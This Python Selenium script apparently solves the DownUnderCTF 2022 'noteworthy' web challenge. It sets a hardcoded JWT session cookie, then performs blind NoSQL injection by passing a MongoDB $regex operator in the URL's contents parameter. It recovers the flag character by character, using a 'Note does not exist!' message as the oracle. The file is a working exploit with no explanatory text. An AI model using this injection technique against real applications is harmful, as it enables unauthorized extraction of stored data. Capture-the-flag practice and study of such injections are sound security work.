from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
from string import ascii_letters, digits
import urllib.parse


flag = ""
flagchars = ascii_letters+digits+"{}_"

url = 'https://web-noteworthy-873b7c844f49.2022.ductf.dev/edit?contents=e&noteId=1337'


browser = webdriver.Firefox()

browser.get(url)
browser.add_cookie({"name":"jwt", "domain":"web-noteworthy-873b7c844f49.2022.ductf.dev", 'value':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2MzJlYTVhOTdiMDNiNjJhM2VhN2YzMmMiLCJpYXQiOjE2NjQwMDE0NTAsImV4cCI6MTY2NDYwNjI1MH0.6L-vdIbhnvt55BYNNXWNIls24Huk6I0ovqBfjfr6P_k'})
browser.get(url)


#questions-text-alignment whiteTextWithShadow question-size-v4


while True:
    for char in flagchars:
        url = f'https://web-noteworthy-873b7c844f49.2022.ductf.dev/edit?contents%5B%24regex%5D=^{urllib.parse.quote(flag+char)}&noteId=1337'
        browser.get(url)
        if not browser.find_elements_by_xpath("//*[contains(text(),'Note does not exist!')]"):#correct!
            flag+=char
            break
        else: #incorrect
            print(char, "incorrect")

    print("current flag", flag)